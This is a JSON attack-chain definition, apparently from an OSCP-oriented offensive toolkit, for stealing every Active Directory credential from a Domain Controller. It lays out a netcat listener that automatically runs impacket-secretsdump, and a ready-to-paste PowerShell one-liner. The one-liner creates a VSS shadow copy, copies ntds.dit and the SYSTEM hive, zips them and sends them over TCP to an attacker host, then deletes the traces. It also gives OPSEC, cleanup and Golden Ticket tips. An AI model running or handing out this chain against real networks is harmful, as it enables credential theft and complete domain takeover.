{
  "id": "vss-ntds-tcp-exfil",
  "name": "VSS NTDS.dit Extraction with TCP Exfiltration",
  "description": "Complete one-liner workflow for NTDS.dit credential extraction: VSS shadow copy creation, NTDS.dit + SYSTEM extraction, compression, TCP exfiltration to Kali, and offline secretsdump parsing.\n\nALTERNATIVE TO DCSYNC: Use this chain when DCSync unavailable (no replication rights) but have local Administrator on Domain Controller. Both methods yield same result (all domain credentials), but different prerequisites.\n\nWHEN TO USE:\n- Local Administrator on DC (or SeBackupPrivilege)\n- DCSync NOT available (no replication rights)\n- Need ALL domain credentials (not just specific users)\n- Network connectivity from DC to Kali on arbitrary port\n- vshadow.exe uploaded to DC (or use vssadmin alternative)\n\nWHEN NOT TO USE:\n- DCSync available (faster, no file transfer, less artifacts)\n- Can't reach Kali from DC (firewall blocks outbound)\n- PowerShell <5.0 (Compress-Archive not available)\n- Target not a Domain Controller (no NTDS.dit)\n\nTWO-PHASE APPROACH:\n1. ATTACKER (Kali): Start listener FIRST - receives compressed zip\n2. TARGET (DC): Execute one-liner - creates shadow, extracts, compresses, sends\n3. ATTACKER (auto): Unzip + secretsdump - extracts all credentials\n\nOPSEC CONSIDERATIONS:\n- Creates persistent VSS shadow copy (evidence artifact)\n- Files temporarily written to C:\\ root\n- TCP egress from DC may trigger alerts\n- Large file transfer (~20-500MB) may be noticed\n- Recommend cleanup after extraction (delete shadow copy)\n\nVS DCSYNC COMPARISON:\n| Aspect          | This Chain          | DCSync           |\n|-----------------|---------------------|------------------|\n| Prerequisites   | Local Admin on DC   | Replication Rights |\n| Network         | TCP to Kali         | RPC to DC        |\n| Artifacts       | Shadow copy, files  | Event logs only  |\n| Detection       | Medium (file ops)   | Low (looks like replication) |\n| Speed           | 2-5 min             | 30sec-2min       |\n| Credentials     | ALL (offline parse) | ALL (live dump)  |",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team - OSCP Track",
    "created": "2025-11-30",
    "updated": "2025-11-30",
    "tags": [
      "OSCP:HIGH",
      "ACTIVE_DIRECTORY",
      "VSS",
      "NTDS",
      "CREDENTIAL_ACCESS",
      "POST_EXPLOITATION",
      "ONE_LINER",
      "TCP_EXFIL",
      "POWERSHELL"
    ],
    "category": "post-exploitation",
    "platform": "windows",
    "references": [
      "https://attack.mitre.org/techniques/T1003/003/",
      "https://github.com/fortra/impacket",
      "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin",
      "https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz#vol-shadow-copy"
    ]
  },
  "difficulty": "intermediate",
  "time_estimate": "5 minutes (1 min setup, 2-3 min transfer, 1 min parsing)",
  "oscp_relevant": true,
  "prerequisites": [
    "Local Administrator on Domain Controller (or SeBackupPrivilege)",
    "vshadow.exe uploaded to DC (from Windows SDK) OR use vssadmin alternative",
    "PowerShell 5.0+ on DC (for Compress-Archive cmdlet)",
    "Network connectivity: DC can reach Kali on specified port (outbound)",
    "Netcat available on Kali (apt install netcat-traditional)",
    "Impacket installed on Kali (apt install impacket-scripts)"
  ],
  "notes": "COMPLETE ONE-LINER WORKFLOW: Extracts ALL domain credentials in single command execution.\n\nCRITICAL: Start attacker-side listener BEFORE executing target-side command. TCP connection is one-shot - if listener not ready, data lost.\n\nWORKFLOW STEPS:\n1. Start listener on Kali (Step 1)\n2. Execute PowerShell one-liner on DC (Step 2)\n3. Wait for transfer (~30sec-2min depending on NTDS.dit size)\n4. Listener auto-continues: unzip + secretsdump\n5. All domain credentials printed to terminal\n\nOUTPUT FORMAT (secretsdump):\ndomain\\username:RID:LMhash:NThash:::\nExample: CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::\n\nKEY HASHES TO EXTRACT:\n- Administrator:500 - Domain Admin NTLM for Pass-the-Hash\n- krbtgt:502 - Golden Ticket creation\n- Service accounts - Often weak passwords, crack with hashcat\n\nALTERNATIVE WITHOUT VSHADOW:\nReplace vshadow.exe with native vssadmin in the one-liner:\n$out = vssadmin create shadow /for=C: | Out-String\n(Rest of command remains same)\n\nCLEANUP (Optional - remove artifacts on DC):\nvssadmin delete shadows /for=C: /all /quiet\n\nFILE SIZE REFERENCE:\n- Small domain (<100 users): 20-50 MB\n- Medium domain (100-1000 users): 50-200 MB\n- Large domain (1000+ users): 200-500+ MB\n\nFAILURE RECOVERY:\nIf transfer fails midway:\n1. Kill listener on Kali (Ctrl+C)\n2. Delete partial loot.zip\n3. On DC: Files may still exist in C:\\ - manually cleanup or re-run\n4. Restart listener and re-execute one-liner\n\nEXAM TIPS:\n- Test network connectivity BEFORE running: Test-NetConnection -ComputerName <LHOST> -Port <LPORT>\n- Use high port (>1024) to avoid permission issues on Kali\n- Pipe secretsdump output to file: ... | tee domain_hashes.txt\n- Immediately extract krbtgt hash for Golden Ticket backup\n- Delete sensitive files after use: rm loot.zip ntds.dit system.bak",
  "steps": [
    {
      "id": "start-listener",
      "name": "Start Netcat Listener on Kali (MUST BE FIRST)",
      "objective": "Start listener to receive compressed NTDS.dit + SYSTEM zip file from target DC",
      "description": "Start netcat listener on Kali BEFORE executing target-side command. The listener will automatically continue to unzip and parse with secretsdump after transfer completes.\n\nCommand:\n```\nnc -lvnp <LPORT> -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL\n```\n\nCommand Breakdown:\n- nc -lvnp <LPORT>: Listen on specified port\n- -q 0: Quit after EOF (when target closes connection)\n- > loot.zip: Save received data to zip file\n- &&: Continue only if previous command succeeded\n- unzip loot.zip: Extract ntds.dit and system.bak\n- impacket-secretsdump: Parse NTDS.dit offline, extract all credentials\n\nRecommended Port: 9001 (high port, no root needed, not commonly blocked)\n\nExecution:\n1. Open terminal on Kali\n2. Navigate to working directory: cd /tmp/loot or mkdir /tmp/loot && cd /tmp/loot\n3. Run the listener command\n4. Wait for 'Listening on 0.0.0.0 <PORT>' message\n5. Proceed to Step 2 (target-side execution)\n\nWhat Happens:\n1. Listener waits for incoming connection\n2. Target DC connects, sends zip file\n3. Connection closes (EOF)\n4. -q 0 causes nc to exit immediately\n5. && triggers unzip\n6. && triggers secretsdump\n7. All credentials printed to terminal\n\nOutput Capture (Recommended):\nAdd tee to save output:\n```\nnc -lvnp <LPORT> -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL | tee domain_hashes.txt\n```\n\nAlternative Listeners:\n1. Without auto-parsing (manual steps after):\n   ```\n   nc -lvnp <LPORT> > loot.zip\n   ```\n   Then manually: unzip loot.zip && impacket-secretsdump ...\n\n2. Using ncat (Nmap version):\n   ```\n   ncat -lvnp <LPORT> > loot.zip && ...\n   ```\n\n3. Using socat:\n   ```\n   socat TCP-LISTEN:<LPORT>,reuseaddr,fork - > loot.zip && ...\n   ```",
      "command_ref": "post-nc-receive-zip-secretsdump",
      "evidence": [
        "Terminal shows 'Listening on 0.0.0.0 <PORT>'",
        "No 'Address already in use' error",
        "Ready to receive incoming connection"
      ],
      "dependencies": [],
      "repeatable": true,
      "success_criteria": [
        "Listener starts without errors",
        "Port is open and listening",
        "Terminal waiting for connection",
        "Ready to proceed to Step 2"
      ],
      "failure_conditions": [
        "Address already in use: Choose different port or kill existing process (sudo lsof -i :<PORT>)",
        "Permission denied: Use port >1024 or run with sudo",
        "nc not found: Install with 'sudo apt install netcat-traditional'"
      ],
      "next_steps": [
        "execute-target-oneliner"
      ]
    },
    {
      "id": "execute-target-oneliner",
      "name": "Execute PowerShell One-liner on Domain Controller",
      "objective": "Create VSS shadow copy, extract NTDS.dit + SYSTEM, compress, and exfiltrate to Kali listener",
      "description": "Execute the complete PowerShell one-liner on the Domain Controller. This single command performs all extraction and exfiltration in one execution.\n\nCommand:\n```powershell\n$DRIVE=\"C:\"; $LHOST=\"<LHOST>\"; $LPORT=<LPORT>; $VSHADOW=\"<VSHADOW_PATH>\"; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force\n```\n\nVariable Substitution:\n- <LHOST>: Your Kali IP address (e.g., 192.168.45.5)\n- <LPORT>: Port from Step 1 (e.g., 9001)\n- <VSHADOW_PATH>: Full path to vshadow.exe (e.g., C:\\Tools\\vshadow.exe)\n\nExample with variables filled:\n```powershell\n$DRIVE=\"C:\"; $LHOST=\"192.168.45.5\"; $LPORT=9001; $VSHADOW=\"C:\\Tools\\vshadow.exe\"; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force\n```\n\nCommand Stages (in order):\n1. vshadow.exe -nw -p C: \u2192 Creates VSS shadow copy\n2. [regex]::Match \u2192 Extracts shadow copy device name\n3. mklink /d C:\\sc \u2192 Creates symlink to shadow\n4. copy ntds.dit \u2192 Extracts AD database from shadow\n5. reg save hklm\\system \u2192 Exports SYSTEM hive (boot key)\n6. rmdir C:\\sc \u2192 Removes symlink\n7. Compress-Archive \u2192 Creates loot.zip with both files\n8. ReadAllBytes + TcpClient \u2192 Sends zip to Kali\n9. Remove-Item \u2192 Cleans up files on DC\n\nExecution:\n1. Ensure Step 1 listener is running on Kali\n2. From admin shell on DC (Evil-WinRM, PSExec, etc.)\n3. Paste entire one-liner (copy carefully, no line breaks)\n4. Press Enter\n5. Wait for completion (~30sec-2min)\n6. Check Kali terminal for received data\n\nALTERNATIVE WITHOUT VSHADOW (uses native vssadmin):\n```powershell\n$DRIVE=\"C:\"; $LHOST=\"<LHOST>\"; $LPORT=<LPORT>; $out=vssadmin create shadow /for=$DRIVE | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force\n```\nNote: vssadmin is slower (no -nw flag) but requires no upload.\n\nPre-flight Checks:\n1. Verify admin: whoami /groups | findstr Administrators\n2. Test network: Test-NetConnection -ComputerName <LHOST> -Port <LPORT>\n3. Verify vshadow: Test-Path <VSHADOW_PATH>\n4. Check PowerShell version: $PSVersionTable.PSVersion (need 5.0+)",
      "command_ref": "post-vss-ntds-exfil-combo",
      "evidence": [
        "vshadow.exe output showing 'Shadow copy set succesfully created'",
        "mklink output showing 'symbolic link created'",
        "copy output showing '1 file(s) copied'",
        "reg save output showing 'The operation completed successfully'",
        "No errors from Compress-Archive or TCP send",
        "Kali listener receives data (connection shown)"
      ],
      "dependencies": [
        "start-listener"
      ],
      "repeatable": true,
      "success_criteria": [
        "Command executes without terminating errors",
        "VSS shadow copy created successfully",
        "NTDS.dit and SYSTEM extracted",
        "Zip file created and sent to Kali",
        "Cleanup completes (files removed)",
        "Kali listener shows connection received"
      ],
      "failure_conditions": [
        "vshadow.exe not found: Verify path or use vssadmin alternative",
        "Access denied: Not running as local admin",
        "NTDS.dit not found: Target may not be a DC, check path",
        "TCP connection refused: Listener not running or firewall blocking",
        "Compress-Archive not found: PowerShell <5.0, transfer files separately"
      ],
      "next_steps": []
    }
  ]
}